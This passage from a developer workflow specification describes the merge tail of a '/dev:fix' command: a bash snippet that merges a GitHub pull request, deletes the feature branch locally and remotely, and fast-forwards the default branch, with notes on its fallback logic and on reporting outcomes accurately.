    git -C "$PRIMARY" ls-remote --exit-code --heads origin "$BRANCH" >/dev/null 2>&1 \
      && echo "WARNING: remote branch '$BRANCH' still exists but could not be deleted (protected or insufficient token scope) — delete it manually." \
      || true
  }
  git -C "$PRIMARY" branch -D "$BRANCH" 2>/dev/null || true
}

if [ "$ALREADY_MERGED" -eq 0 ]; then
  ( cd "$PRIMARY" && gh pr merge "$PR_NUMBER" --repo "$SLUG" --merge ) || exit 1
fi

RECONCILED=1
if git -C "$PRIMARY" checkout "$DEFAULT_BRANCH" 2>/dev/null; then
  git -C "$PRIMARY" pull --ff-only origin "$DEFAULT_BRANCH" || RECONCILED=0
else
  RECONCILED=0
  git -C "$PRIMARY" checkout --detach || exit 1
fi

delete_feature_branch || exit 1
```

Ordering matters: the local branch cannot be deleted while it is checked out, so the checkout comes
first.

**The `--detach` fallback is what makes the "re-run it" advice true.** `checkout "$DEFAULT_BRANCH"`
fails if another worktree already holds that branch — git forbids one branch in two worktrees — and
that failure is identical on every re-run, so a bare `|| exit 1` would strand the feature branch
undeleted forever. Detaching frees the feature branch just as well, so the deletion still completes;
only the primary-checkout reconciliation is skipped. The canonical solves the same problem the same
way (`done/SKILL.md:56-133` uses `checkout --detach` throughout its worktree path).

**Detaching is scoped to the checkout failure specifically** — an `if`/`else`, not an
`A && B || C` compound. A failed `pull --ff-only` after a *successful* checkout sets `RECONCILED=0`
and stops there; detaching would be no remedy for it and would leave the primary checkout detached
for no reason, which a later `/dev:fix merge` would then refuse on the detached-HEAD guard.

**Why not `gh pr merge --delete-branch`?** `gh`'s `--delete-branch` runs its cleanup after the
server-side merge and reads the current branch to do it, which makes it fragile in exactly the states
this lane can be in. `gh pr merge --merge` on its own never reads the current branch; deleting both
branches with explicit git plumbing is deterministic regardless of what `HEAD` points at. Do not
re-add `--delete-branch`.

### Closeout hook

The seam's fourth hook (§A1), fired after `delete_feature_branch` returns 0.

**On a Linear-sourced branch it is a deliberate no-op.** The `Closes [<ID>](<url>)` line in the PR
body closes the issue on merge, so nothing here needs to transition it. A second writer for one state
invites double-transitions — an issue moved to "done" by the integration and then moved again by the
tail, racing. This absence is a decision, not an omission.

**On a free-text branch it is also a no-op**, since there is no external record to update.

### Report

When `RECONCILED=1`, state all four end states plainly: PR merged, remote branch gone, local branch
gone, primary checkout on `$DEFAULT_BRANCH` at the merged tip with a clean tree.

**When `RECONCILED=0`, report three** — plus whichever of these two actually applies, spelled out in
full, because they leave the checkout in different places:

- checkout failed → "primary checkout left **detached**; reconciliation skipped (another worktree
  holds `$DEFAULT_BRANCH`)"
- checkout succeeded, pull failed → "primary checkout is **on `$DEFAULT_BRANCH`** but was not
  fast-forwarded (`pull --ff-only` did not apply)"

The fourth state is genuinely unmet either way, and saying so is the whole point.

**Read each state from the command that produced it — do not assert them.** Most of the sequence exits
on failure, but the reconciliation path deliberately does not, so "we got here" is not by itself proof
that all four hold. A Report written as a template rather than as a read is how a partial run comes to
describe itself as a clean one.

**This mirrors `dev:done` Step 2 (`done/SKILL.md:56-133`), which is canonical.** It is duplicated
because the lane writes no `state.json` and so cannot enter that stage. A change to either side
should be reflected at the other. `dev:done` Step 2 and Step 7 carry the matching pointers back to
here. Two branches of the canonical are **deliberately absent**: its detached-HEAD worktree path (the
lane never creates a worktree, so it has only the in-place shape) and its `push_integration` helper
(the lane makes no post-merge commits, so it never pushes to the integration branch).

## Invocation

- `/dev:fix "<what you want done>"` — the lane: ground, triage, branch, change, verify, PR, stop
- `/dev:fix merge` — the tail: merge that PR, delete both branches, fast-forward, report

For a full seven-stage cycle with approval gates, use `/dev`. For a Linear issue, use `/dev:linear`.
